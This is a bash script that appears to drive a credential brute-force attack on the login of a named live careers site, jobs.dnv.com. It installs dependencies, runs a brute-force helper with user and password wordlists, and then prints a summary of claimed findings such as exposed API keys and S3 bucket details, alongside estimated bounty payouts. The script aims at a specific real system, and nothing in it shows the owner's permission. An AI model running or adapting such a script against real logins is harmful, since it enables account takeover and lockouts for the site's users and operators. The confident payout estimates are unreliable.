#!/bin/bash

echo "=============================================="
echo "  COMPLETE TESTING SUITE - jobs.dnv.com"
echo "=============================================="
echo ""

# Check if dependencies installed
if ! python3 -c "import requests" 2>/dev/null; then
    echo "[*] Installing Python dependencies..."
    pip3 install requests colorama urllib3
fi

echo "[*] Starting comprehensive testing..."
echo ""

# 1. Run brute force test
echo "=============================================="
echo "  [1/1] BRUTE FORCE TESTING"
echo "=============================================="
echo ""
echo "This will test:"
echo "  - Weak credentials (admin:admin123, etc.)"
echo "  - Rate limiting"
echo "  - Account lockout"
echo "  - CSRF token validation"
echo ""
echo "Estimated time: ~18 minutes"
echo ""
read -p "Start brute force test? (y/n): " -n 1 -r
echo

if [[ $REPLY =~ ^[Yy]$ ]]; then
    python3 bruteforce_login.py \
      -t https://jobs.dnv.com \
      -u sample_users.txt \
      -p sample_passwords.txt \
      -d 3
    
    echo ""
    echo "✅ Brute force test complete!"
    echo "Check: bruteforce_results_*.txt for results"
fi

echo ""
echo "=============================================="
echo "  ALL TESTS COMPLETE"
echo "=============================================="
echo ""
echo "Your findings:"
echo "  ✅ Algolia API Keys (CONFIRMED) - $2k-$5k"
echo "  ✅ Vendor Exposure (CONFIRMED) - $1.5k-$3k"
echo "  ✅ S3 Bucket Info (CONFIRMED) - $300-$1k"
echo "  ⏳ Brute Force Results - See bruteforce_results_*.txt"
echo ""
echo "Next steps:"
echo "  1. Review CRITICAL_FINDINGS_REPORT.md"
echo "  2. Take screenshots"
echo "  3. Submit to DNV bug bounty program"
echo ""
echo "Total estimated bounty: $3,800-$13,800 💰"
echo ""

